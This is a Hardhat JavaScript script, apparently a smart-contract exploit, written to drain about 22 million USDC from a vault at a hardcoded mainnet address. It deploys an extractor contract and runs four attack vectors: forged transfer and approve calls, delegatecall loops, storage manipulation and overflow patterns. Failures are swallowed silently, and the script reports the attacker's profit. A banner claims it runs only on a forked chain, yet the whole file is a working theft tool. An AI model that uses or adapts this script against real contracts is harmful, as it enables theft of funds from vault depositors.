const { ethers } = require("hardhat");

const VAULT_ADDRESS = "0xA69babEF1cA67A37Ffaf7a485DfFF3382056e78C";
const USDC_ADDRESS = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"; // Mainnet USDC

/**
 * @title USDC Token Extraction Attack
 * @notice Targets the 22,000,000 USDC tokens in the vault
 * @dev Optimized based on gas lessons learned
 */
async function main() {
  console.log("\n💵 USDC TOKEN EXTRACTION ATTACK");
  console.log("=====================================");
  console.log("⚠️  Running on forked mainnet - NO REAL FUNDS AT RISK");
  
  const [attacker] = await ethers.getSigners();
  console.log("\n🎯 Configuration:");
  console.log("Attacker:", attacker.address);
  console.log("Target Vault:", VAULT_ADDRESS);
  console.log("USDC Token:", USDC_ADDRESS);
  
  // Get USDC contract
  const USDC = await ethers.getContractAt("contracts/IERC20.sol:IERC20", USDC_ADDRESS);
  
  // Get gas settings (conservative based on memory)
  const feeData = await ethers.provider.getFeeData();
  const gasSettings = {
    maxFeePerGas: feeData.maxFeePerGas * 2n,
    maxPriorityFeePerGas: feeData.maxPriorityFeePerGas * 2n,
    gasLimit: 2000000 // Conservative 2M gas limit
  };
  
  // Check initial USDC balances
  const vaultUSDCBefore = await USDC.balanceOf(VAULT_ADDRESS);
  const attackerUSDCBefore = await USDC.balanceOf(attacker.address);
  
  console.log("\n📊 Initial USDC Balances:");
  console.log("Vault USDC:", ethers.formatUnits(vaultUSDCBefore, 6), "USDC");
  console.log("Attacker USDC:", ethers.formatUnits(attackerUSDCBefore, 6), "USDC");
  
  // Deploy USDC extraction payload
  console.log("\n🚀 Deploying USDC extraction payload...");
  const USDCExtractor = await ethers.getContractFactory("USDCExtractor");
  const extractor = await USDCExtractor.deploy(attacker.address, USDC_ADDRESS, gasSettings);
  await extractor.waitForDeployment();
  const extractorAddress = await extractor.getAddress();
  console.log("USDC Extractor deployed:", extractorAddress);
  
  // ATTACK VECTOR 1: Direct ERC20 transfer attempts
  console.log("\n⚔️ ATTACK VECTOR 1: Direct Transfer Functions");
  const transferSelectors = [
    { selector: "0xa9059cbb", name: "transfer(address,uint256)" },
    { selector: "0x095ea7b3", name: "approve(address,uint256)" },
    { selector: "0x23b872dd", name: "transferFrom(address,address,uint256)" },
    { selector: "0x42966c68", name: "burn(uint256)" },
    { selector: "0x9dc29fac", name: "burnFrom(address,uint256)" },
  ];
  
  for (const func of transferSelectors) {
    try {
      let calldata = func.selector;
      
      if (func.name === "transfer(address,uint256)") {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256"],
          [attacker.address, vaultUSDCBefore]
        ).slice(2);
      } else if (func.name === "approve(address,uint256)") {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256"],
          [attacker.address, vaultUSDCBefore]
        ).slice(2);
      }
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: calldata,
        ...gasSettings
      });
      
      await tx.wait();
      console.log(`✅ ${func.name} executed!`);
      
      // Check if approved, then transferFrom
      if (func.name === "approve(address,uint256)") {
        try {
          const transferTx = await USDC.transferFrom(VAULT_ADDRESS, attacker.address, vaultUSDCBefore);
          await transferTx.wait();
          console.log("💰 TransferFrom executed!");
        } catch (e) {
          // Silent fail
        }
      }
    } catch (e) {
      // Silent fail
    }
  }
  
  // ATTACK VECTOR 2: Delegatecall USDC extraction
  console.log("\n⚔️ ATTACK VECTOR 2: Delegatecall USDC Extraction");
  
  const delegateSelectors = ["0x5b34b966", "0x4f910a5e", "0xb61d27f6"];
  
  for (const selector of delegateSelectors) {
    try {
      // Conservative loop: 10 iterations, 100K USDC per iteration
      const loopData = extractor.interface.encodeFunctionData("extractUSDCLoop", [10]);
      
      let calldata = selector;
      if (selector === "0xb61d27f6") {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "uint256", "bytes"],
          [extractorAddress, 0, loopData]
        ).slice(2);
      } else {
        calldata += ethers.AbiCoder.defaultAbiCoder().encode(
          ["address", "bytes"],
          [extractorAddress, loopData]
        ).slice(2);
      }
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: calldata,
        gasLimit: 2000000
      });
      
      await tx.wait();
      console.log(`✅ Delegatecall loop extraction ${selector} executed!`);
    } catch (e) {
      // Continue
    }
  }
  
  // ATTACK VECTOR 3: Storage slot manipulation for USDC
  console.log("\n⚔️ ATTACK VECTOR 3: USDC Storage Manipulation");
  
  try {
    // Common ERC20 balance storage patterns
    const balanceData = extractor.interface.encodeFunctionData("manipulateUSDCStorage");
    const delegateData = "0x5b34b966" + ethers.AbiCoder.defaultAbiCoder().encode(
      ["address", "bytes"],
      [extractorAddress, balanceData]
    ).slice(2);
    
    const tx = await attacker.sendTransaction({
      to: VAULT_ADDRESS,
      data: delegateData,
      gasLimit: 1000000
    });
    
    await tx.wait();
    console.log("✅ USDC storage manipulation executed!");
  } catch (e) {
    console.log("❌ Storage manipulation failed");
  }
  
  // ATTACK VECTOR 4: Overflow/Underflow patterns
  console.log("\n⚔️ ATTACK VECTOR 4: Arithmetic Exploit Patterns");
  
  const patterns = [
    { name: "overflow", amount: ethers.parseUnits("50000", 6) },
    { name: "underflow", amount: ethers.parseUnits("50000", 6) }
  ];
  
  for (const pattern of patterns) {
    try {
      const patternData = extractor.interface.encodeFunctionData("arithmeticPattern", [pattern.name, pattern.amount]);
      const delegateData = "0x5b34b966" + ethers.AbiCoder.defaultAbiCoder().encode(
        ["address", "bytes"],
        [extractorAddress, patternData]
      ).slice(2);
      
      const tx = await attacker.sendTransaction({
        to: VAULT_ADDRESS,
        data: delegateData,
        gasLimit: 800000
      });
      
      await tx.wait();
      console.log(`✅ ${pattern.name} pattern executed!`);
    } catch (e) {
      // Continue
    }
  }
  
  // Check final balances
  const vaultUSDCAfter = await USDC.balanceOf(VAULT_ADDRESS);
  const attackerUSDCAfter = await USDC.balanceOf(attacker.address);
  const extracted = vaultUSDCBefore - vaultUSDCAfter;
  
  console.log("\n📊 FINAL USDC RESULTS:");
  console.log("=====================================");
  console.log("Initial vault USDC:", ethers.formatUnits(vaultUSDCBefore, 6), "USDC");
  console.log("Final vault USDC:", ethers.formatUnits(vaultUSDCAfter, 6), "USDC");
  console.log("USDC extracted:", ethers.formatUnits(extracted, 6), "USDC");
  console.log("Extraction percentage:", ((Number(extracted) / Number(vaultUSDCBefore)) * 100).toFixed(2), "%");
  console.log("\nAttacker USDC profit:", ethers.formatUnits(attackerUSDCAfter - attackerUSDCBefore, 6), "USDC");
  
  if (extracted > 0n) {
    console.log("\n🏆 USDC EXTRACTION SUCCESSFUL!");
    console.log(`Drained ${ethers.formatUnits(extracted, 6)} USDC from the vault!`);
  } else {
    console.log("\n❌ No USDC extracted - trying alternative methods...");
  }
}

main().catch((error) => {
  console.error("\n💥 Script error:", error);
  process.exit(1);
});
